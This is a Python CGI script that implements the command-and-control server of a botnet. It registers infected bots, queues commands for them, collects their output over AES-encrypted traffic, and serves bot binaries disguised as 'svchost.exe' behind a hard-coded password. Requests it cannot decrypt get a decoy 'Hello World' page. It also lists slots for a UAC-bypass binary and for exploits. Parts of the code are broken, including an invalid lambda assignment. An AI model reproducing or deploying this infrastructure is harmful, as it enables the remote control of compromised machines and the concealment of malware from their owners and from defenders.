#!/usr/bin/python
import cgi
import psycopg2
import base64
import json
import string
import os
import traceback
import hashlib
import random
import subprocess
import sys
import time
import uuid
from MySQLdb import escape_string
from Crypto.Cipher import AES
form = cgi.FieldStorage()
db = psycopg2.connect(dbname='', user='', host='localhost', password='')
db.autocommit = True
sql = db.cursor()


def _encodeAES(secret, cipher):
    try:
        cipher = AES.new(cipher)

        return base64.urlsafe_b64encode(cipher.encrypt(secret + (32-len(secret)%32)*'{')).encode('ascii')
    
    except:

        return False


def _decodeAES(secret, cipher):
    try:
        cipher = AES.new(cipher)

        return cipher.decrypt(base64.urlsafe_b64decode(secret.encode('ascii'))).rstrip('{')

    except:

        return False


def _version():
    sql.execute("SELECT value FROM config WHERE name='lversion'")
    return sql.fetchone()[0]
    
def _add_header(header):
    response = sys.stdout.getvalue()
    response = response.split('\n\n')
    response[0] = response[0] + '\n' + header
    out = ''
    map(lambda x: out = out + '\n\n' + x, response)
    sys.stdout.write(out.lstrip('\n\n'))

    return True

def cmd_stop(args={}):
    output = args['output']
    prompt = args['prompt']
    cmdid = args['cmdid']
    botid = args['botid']

    output = base64.urlsafe_b64encode(str(output))
    sql.execute("UPDATE cmds SET running=False, response=%s, prompt=%s WHERE cmdid=%s", (output, prompt, cmdid))

    return True


def bot_stop(args={}):
    botid = args['botid']

    sql.execute("UPDATE bots SET running=False WHERE botid=%s", (botid,))

    return True


def update(args={}):
    pass
    #botid = args['botid']

    #sql.execute("UPDATES bots SET version='?' WHERE botid='?'", (_version(), botid))
    #binary = cmd({'cmd': 'create-bot.py version=SELECT value FROM config WHERE name=\'lversion\' AESkey=' + cipher + ' id=' + botid})
    
    #return {'binary': binary}

def binary_get(args={}):
    binary = args['binary']
    
    if binary in binaries:
    
        return {'binary': binaries[binary]}
    
    else:
    
        return False


def bot_start(args={}):
    botid = args['botid']

    sql.execute("UPDATE bots SET running=True, ip=%s WHERE botid=%s", (os.environ["REMOTE_ADDR"], botid))

    return True


def cmd_get(args={}):
    botid = args['botid']

    sql.execute("UPDATE cmds SET running=True, starttime=current_timestamp WHERE botid=%s AND running is NULL AND starttime is NULL RETURNING function, args, cmdid", (botid,))
    cmds = []
    for cmd in sql.fetchall():
        c = {}
        c['function'] = cmd[0]
        c['args'] = json.loads(base64.urlsafe_b64decode(cmd[1]))
        c['cmdid'] = cmd[2]
        cmds.append(c)

    return cmds
    

def bot_create(args={}):
    file = open('cache/binary_data', 'r+')
    d = file.readlines()
    file.seek(0)
    for i in d[1:]:
        file.write(i)
    file.truncate()
    file.close()
    binary = d[0].split(',')

    sql.execute("INSERT INTO bots VALUES (current_timestamp, False, %s, %s, %s)", (binary[2], binary[3][:32], _version()))
    _add_header('Content-Disposition: inline; filename="svchost.exe"')

    return binary[0]


def bot_delete(args={}):
    botid = args['botid']

    sql.execute("DELETE FROM bots WHERE botid=%s", (botid,))

    return True


def main():
    data = False
    if 'data' in form:
        data = form['data'].value
    if data == 'opensesame2548':
        sys.stdout.write(json.dumps(bot_create()))
        return

    sql.execute("SELECT botid, cipher FROM bots;")
    bots = sql.fetchall()
    decrypted = False

    for bot in bots:
        try:
            d = _decodeAES(data, bot[1])
            d = json.loads(d)
            if d[1] == bot[0]:
                decrypted = True
                d[2]['botid'] = escape_string(d[1])
                output = json.dumps(functions[d[0]](d[2]))
                sys.stdout.write(_encodeAES(output, bot[1]))

        except ValueError:
            continue
        
    if decrypted == False:
        print "<html><body><p>Hello World!</p></body></html>"


binaries = {'bypassuac': 'somebinaryshittohackmorepeople00...\\x',
            'exploit1': '',
            'exploit2': ''}

functions = {'cmd-stop': cmd_stop,
             'cmd-get': cmd_get,
             'bot-stop': bot_stop,
             'bot-start': bot_start,
             'bot-create': bot_create,
             'bot-delete': bot_delete,
             'update': update,
             'binary-get': binary_get}

if __name__ == '__main__':
    try:
        sys.stdout.write("Content-type: text/html\n\n")
        main()
    
    except IndexError:
        pass

    except:
        sys.stderr.write('\n' + str(traceback.print_exc()))

    finally:
        db.commit()
        db.close()


